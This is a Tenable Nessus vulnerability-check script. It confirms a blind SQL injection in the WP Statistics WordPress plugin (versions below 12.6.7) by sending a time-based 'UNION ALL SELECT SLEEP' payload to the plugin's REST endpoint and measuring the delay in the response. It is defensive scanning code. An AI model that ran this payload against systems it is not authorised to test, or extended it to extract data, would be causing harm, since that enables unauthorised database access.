#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(126382);
  script_version("1.1");
  script_cvs_date("Date: 2019/07/02 12:34:22");

  script_name(english:"WP Statistics Plugin for WordPress < 12.6.7 Blind SQL Injection");
  script_summary(english:"Attempts to exploit a SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a remote
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WP Statistics Plugin for WordPress running on the remote web
server is affected by a SQL injection vulnerability due to improper
sanitization of user-supplied input. An unauthenticated, remote
attacker can exploit this issue to inject or manipulate SQL queries
in the back-end database, resulting in the manipulation of arbitrary
data.");
  script_set_attribute(attribute:"see_also", value:"https://wpvulndb.com/vulnerabilities/9412");
  # https://github.com/wp-statistics/wp-statistics/commit/bd46721b97794a1b1520e24ff5023b6da738dd75
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c1f1e9ef");
  script_set_attribute(attribute:"solution", value:
"Upgrade the WP Statistics Plugin for WordPress to version 12.6.7 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Tenable score for SQL Injection.");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/07/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/07/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/07/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

app = "WordPress";

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin     = "WP Statistics";
plugin_dir = "/wp-content/plugins/wp-statistics/";
plugin_url = build_url(port:port, qs:dir + plugin_dir);

installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  checks[plugin_dir + "readme.txt"][0] = make_list('=== WP Statistics ===');
  checks[plugin_dir + "languages/default.mo"][0] = make_list('Project-Id-Version: *WP Statistics');

  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# first we check if the "cache plugin" is even enabled
# this will respond with a 200 OK if it is enabled and a 404 if it is not
url = "/wp-json/wpstatistics/v1/hit";
postdata = "wp_statistics_hit=x&wp_statistics_hit[track_all]=1&wp_statistics_hit[page_uri]=x&wp_statistics_hit[search_query]=x";
res = http_send_recv3(
  method  : "POST",
  port    : port,
  item    : dir + url,
  data    : postdata,
  content_type : 'application/x-www-form-urlencoded',
  exit_on_fail : TRUE
);
if ("200 OK" >!< res[0])
    audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, plugin_url, plugin + " plugin");

# then we attempt to exploit it
stimes = make_list(3, 9, 15);
num_queries = max_index(stimes);

vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  url = "/wp-json/wpstatistics/v1/hit";
  postdata = "wp_statistics_hit=x&wp_statistics_hit[track_all]=1&wp_statistics_hit[page_uri]=x&wp_statistics_hit[search_query]=x' UNION ALL SELECT SLEEP(" + stimes[i] + ")-- x";

  postdata = urlencode(
    str        : postdata,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789=+&_"
  );

  res = http_send_recv3(
    method  : "POST",
    port    : port,
    item    : dir + url,
    data    : postdata,
    content_type : 'application/x-www-form-urlencoded',
    exit_on_fail : TRUE
  );

  now = unixtime();
  ttime = now - then;

  query = '... UNION ALL SELECT SLEEP(' +stimes[i]+ ');';

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : ' + query +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
    vuln = FALSE;
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, plugin_url, plugin + " plugin");

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  sqli       : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : output
);
